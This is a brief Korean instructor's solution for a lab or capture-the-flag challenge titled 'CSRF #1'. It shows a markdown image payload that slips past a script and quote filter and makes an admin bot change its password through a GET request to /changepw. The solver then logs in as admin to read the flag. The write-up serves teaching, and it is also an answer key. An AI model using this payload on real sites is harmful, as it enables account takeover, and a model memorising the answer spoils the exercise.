# [강사용] CSRF #1 (원본 풀이)
script/따옴표는 막히지만 마크다운 이미지가 `<img>` 로 치환됨. 게시글 본문:
```
![asdf](/changepw?userid=admin&userpw=asdfasdf)
```
→ `<img src="/changepw?userid=admin&userpw=asdfasdf" id="asdf">`.
신고에 `http://csrf-1:9104/board/<seq>` 제출 → 봇(admin·내부망)이 열람 시 changepw 발동 → admin/asdfasdf 로그인 → `/board/0` flag.
